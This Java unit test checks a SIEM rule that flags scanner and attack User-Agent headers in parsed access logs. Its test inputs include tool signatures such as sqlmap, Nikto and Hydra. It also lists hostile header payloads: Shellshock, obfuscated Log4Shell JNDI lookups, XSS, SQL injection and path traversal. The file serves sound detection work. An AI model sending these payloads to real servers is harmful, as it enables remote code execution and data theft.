package com.siem.analyzer.detect;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;

import com.siem.analyzer.domain.NormalizedEvent;
import com.siem.analyzer.parse.AccessLogParser;
import java.time.Duration;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * The built-in scanner User-Agent rule, fed combined-format lines through the production access-log
 * parser.
 */
class ScannerUserAgentRuleTest {

    private final AccessLogParser accessLogs = new AccessLogParser();
    private final RuleEngine engine = new RuleEngine(List.of(ScannerUserAgentRule.rule()));

    /** A combined-format line for {@code GET /}, answered {@code status}, sent by {@code agent}. */
    private NormalizedEvent request(String agent, int status) {
        String line =
                ("198.51.100.23 - - [14/Sep/2026:10:15:30 +0000] \"GET /admin HTTP/1.1\" %d 512"
                                + " \"-\" \"%s\"")
                        .formatted(status, agent);
        return accessLogs.parse(line).orElseThrow(() -> new AssertionError(line));
    }

    private List<Detection> feed(String agent, int status) {
        return engine.evaluateAll(List.of(request(agent, status)));
    }

    @Test
    void storedExpressionParses() {
        DetectionRule rule = ScannerUserAgentRule.rule();

        assertEquals("scanner-user-agent", rule.name());
        assertFalse(rule.expression().isWindowed());
    }

    @Test
    void oneScannerRequestFires() {
        List<Detection> fired = feed("sqlmap/1.7.2#stable (https://sqlmap.org)", 200);

        assertEquals(1, fired.size());
        assertEquals("scanner-user-agent", fired.get(0).rule().name());
        assertEquals("198.51.100.23", fired.get(0).trigger().srcIp());
        assertEquals("matched scanner-user-agent", fired.get(0).summary());
    }

    @ParameterizedTest
    @ValueSource(
            strings = {
                // Attack tools under their default headers, whatever the server answered.
                "sqlmap/1.7.2#stable (https://sqlmap.org)",
                "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)",
                "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
                "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
                "Mozilla/5.0 zgrab/0.x",
                "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
                "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
                "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
                "gobuster/3.6",
                "Fuzz Faster U Fool v2.1.0-dev",
                "Wfuzz/3.1.0",
                "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Acunetix-WVS",
                "Mozilla/4.0 (Hydra)",
                "ZmEu",
                "Morfeus Fucking Scanner",
                "NESSUS::SOAP",
                // Payloads aimed at whatever logs or parses the header.
                "() { :; }; /bin/bash -c id",
                "${jndi:ldap://203.0.113.5:1389/a}",
                "${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.5/a}",
                "${${lower:j}ndi:dns://203.0.113.5/a}",
                "<script>alert(1)</script>",
                "Mozilla/5.0 UNION ALL SELECT NULL,NULL--",
                "Mozilla/5.0 and sleep(5)#",
                "../../../../etc/passwd",
            })
    void scannersFire(String agent) {
        assertEquals(1, feed(agent, 200).size(), agent);
    }

    @ParameterizedTest
    @CsvSource(
            delimiter = '|',
            value = {
                "curl/8.4.0|404",
                "curl/7.68.0|403",
                "Wget/1.21.4|500",
                "python-requests/2.31.0|401",
                "Python-urllib/3.11|404",
                "python-httpx/0.27.0|400",
                "Python/3.11 aiohttp/3.9.1|404",
                "Go-http-client/1.1|404",
                "libwww-perl/6.72|403",
                "lwp-trivial/1.41|404",
                "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041|404",
                "HTTPie/3.2.2|405",
                "Java/17.0.8|404",
            })
    void refusedCommandLineClientsFire(String agent, int status) {
        assertEquals(1, feed(agent, status).size(), agent);
    }

    @ParameterizedTest
    @CsvSource(
            delimiter = '|',
            value = {
                // Command-line clients the server answered: health checks, scripts, redirects.
                "curl/8.4.0|200",
                "Wget/1.21.4|304",
                "python-requests/2.31.0|201",
                "Go-http-client/2.0|302",
                // Browsers, crawlers and apps, whatever they were answered.
                "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0|200",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                        + " Chrome/129.0.0.0 Safari/537.36|404",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15"
                        + " (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1|500",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)|404",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)|200",
                "okhttp/4.12.0|200",
                "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/AP2A.240905.003)|404",
                // Tool names inside a longer word, and lookalikes of the payloads.
                "HydrangeaBrowser/1.0|404",
                "nmapper-dashboard/2.0|404",
                "Mozilla/5.0 (Macintosh) Sleepy/1.0 (compatible; sleep tracker)|200",
                "MyApp/1.0 (build ${BUILD_NUMBER})|200",
                "Mozilla/5.0 (X11; Linux) Version/1.2...beta|200",
            })
    void ordinaryClientsDoNot(String agent, int status) {
        assertEquals(List.of(), feed(agent, status), agent);
    }

    @Test
    void aRequestWithoutUserAgentDoesNot() {
        assertEquals(List.of(), feed("-", 404));
    }

    @Test
    void hostileHeadersStayFast() {
        // Each pads a near-match with what the possessive runs consume, so a pattern that
        // backtracked would take quadratic time or worse.
        List<String> agents =
                List.of(
                        "(" + " ".repeat(100_000) + ")" + " ".repeat(100_000) + "x",
                        "union" + " ".repeat(100_000) + "all" + " ".repeat(100_000) + "x",
                        "sleep" + " ".repeat(100_000) + "(" + " ".repeat(100_000) + "x",
                        "${".repeat(100_000),
                        "a".repeat(200_000) + "curl");
        for (String agent : agents) {
            assertTimeoutPreemptively(Duration.ofSeconds(5), () -> feed(agent, 404));
        }
    }
}
